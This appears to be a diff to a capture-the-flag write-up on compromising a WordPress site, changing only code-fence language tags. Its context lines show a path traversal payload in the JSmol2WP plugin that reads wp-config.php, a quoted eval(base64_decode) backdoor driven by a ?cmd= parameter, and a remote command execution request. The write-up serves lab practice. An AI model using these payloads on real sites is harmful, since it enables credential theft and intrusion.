@@ -69,7 +69,7 @@ Found vulnerable plugin: **JSmol2WP**
 
 Used the following payload to read `wp-config.php`:
 
-```http
+```
 /wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php
 ```
 
@@ -90,7 +90,7 @@ Logged into WordPress as `wpuser` and found a private to-do list:
 
 Used the same path traversal technique:
 
-```http
+```
 /wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-content/plugins/hello.php
 ```
 
@@ -108,7 +108,7 @@ eval(base64_decode('...')); // Executes commands passed via GET parameter ?cmd=
 
 Triggered RCE:
 
-```http
+```
 http://<target-ip>/wp-admin/index.php?cmd=id
 ```
 
